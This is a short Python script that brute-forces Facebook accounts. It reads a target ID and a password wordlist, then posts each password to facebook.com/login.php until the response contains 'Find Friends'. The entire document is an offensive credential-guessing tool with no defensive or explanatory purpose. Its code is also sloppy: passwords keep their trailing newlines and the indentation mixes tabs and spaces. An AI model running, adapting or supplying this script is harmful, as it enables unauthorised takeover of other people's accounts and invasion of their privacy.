import requests,random

url = 'https://www.facebook.com/login.php'
username = input('Id : ')
wordlist = input('Wordlist : ')
passwords = open(wordlist, 'r')

for password in passwords:
    payload = {
        'email': username,
        'pass': password
    }
    
    session = requests.session()
    response = session.post(url, data=payload)
    
    if 'Find Friends' in response.text: # Check if 'Find Friends' is present in the response text
        print(f'Login successful! Password found: {password}')
        break
    else:
    	print(f'Login failed with password: {password}')
        